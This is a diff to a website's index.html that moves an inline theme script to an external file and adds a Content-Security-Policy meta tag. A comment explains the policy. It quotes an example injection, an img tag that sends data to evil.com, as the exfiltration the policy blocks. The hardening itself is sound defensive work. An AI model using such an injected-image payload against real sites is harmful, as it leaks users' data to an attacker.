@@ -26,20 +26,34 @@
 
     <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Ccircle cx='16' cy='16' r='15' fill='%230C6B54'/%3E%3Cpath d='M16 1a15 15 0 0 1 13 22L16 16z' fill='%23B5502F'/%3E%3C/svg%3E" />
 
-    <script>
-      // Apply the stored theme before first paint so there is no flash of the
-      // wrong palette. Kept inline and tiny on purpose.
-      (function () {
-        try {
-          var t = localStorage.getItem('compass:theme') || 'compass';
-          var m = localStorage.getItem('compass:mode');
-          if (!m) m = matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
-          document.documentElement.dataset.theme = t;
-          document.documentElement.dataset.mode = m;
-          document.documentElement.style.colorScheme = m;
-        } catch (e) {}
-      })();
-    </script>
+    <!-- Package 22, Tier 3 — this is the ONE place the whole site restricts
+         itself: a meta-tag CSP (GitHub Pages serves static files with no
+         header control, so this is the only way to set one at all) applies
+         site-wide, not just to /work's CV-reading panel, since a single
+         index.html cannot scope a policy per route. img-src/connect-src
+         'self' is the actual defense the work order names — this is what
+         stops <img src="https://evil.com/?d=…"> from ever reaching a
+         network request if injected CV content somehow got rendered as
+         markup. The two named exceptions are load-bearing, not convenience:
+         the Worker's own origin (the ONE legitimate cross-origin call this
+         site ever makes) and challenges.cloudflare.com (Turnstile's own
+         script + verification iframe, with no substitute). style-src needs
+         'unsafe-inline' for React's own style={{}} prop, used throughout
+         this codebase — a different, much lower-stakes exception than
+         script-src, which stays free of 'unsafe-inline' entirely (this is
+         why the theme script above moved to an external file). -->
+    <meta http-equiv="Content-Security-Policy" content="
+      default-src 'self';
+      img-src 'self';
+      connect-src 'self' https://cs-compass-cv.bigbookarchive.workers.dev https://challenges.cloudflare.com;
+      script-src 'self' https://challenges.cloudflare.com;
+      frame-src https://challenges.cloudflare.com;
+      style-src 'self' 'unsafe-inline';
+      base-uri 'self';
+      form-action 'self';
+    " />
+
+    <script src="/theme-init.js"></script>
   </head>
   <body>
     <div id="root"></div>
